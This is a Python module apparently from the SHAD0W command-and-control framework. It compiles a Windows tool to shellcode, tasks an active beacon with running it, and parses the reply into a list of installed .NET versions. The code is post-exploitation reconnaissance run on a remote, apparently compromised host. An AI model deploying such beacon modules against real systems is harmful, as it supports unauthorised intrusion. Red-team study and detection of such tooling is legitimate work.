#
# Determine the dotnet versions installed on a system
#

from lib import buildtools

__description__ = "Show installed .NET versions"
__author__ = "@_batsec_"
__type__ = "enumeration"

EXEC_ID = 0x3000


def format_data(shad0w, data):
    data = data.splitlines()

    if data[0] == "C:\\Windows\\Microsoft.NET\\Framework\\":
        shad0w.debug.log(".NET (Universal)", log=True)
        for line in data:
            if "v" in line:
                shad0w.debug.log(f"-\t{line}", log=True, pre=False)

    if len(data[0]) == 0:
        shad0w.debug.log(".NET (x64)", log=True)
        for line in data:
            if "v" in line:
                shad0w.debug.log(f"-\t{line}", log=True, pre=False)


def dotnet_callback(shad0w, data):
    # well its kind of true
    if "v" not in data:
        shad0w.debug.error(".NET is not installed.")
        return ""

    data = data.split("C:\\Windows\\Microsoft.NET\\Framework64\\")

    # should be 64 bit
    format_data(shad0w, data[0])

    # should be universal
    format_data(shad0w, data[1])

    return ""


def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon.")
        return

    # clone all the source files
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/dotnet/", builddir="/root/shad0w/modules/windows/dotnet/build")

    # compile the module
    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/dotnet/build", modlocation="/root/shad0w/modules/windows/dotnet/module.exe", arch="x64")

    # get the shellcode from the module
    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/dotnet/module.exe", want_base64=True)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["callback"] = dotnet_callback
    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
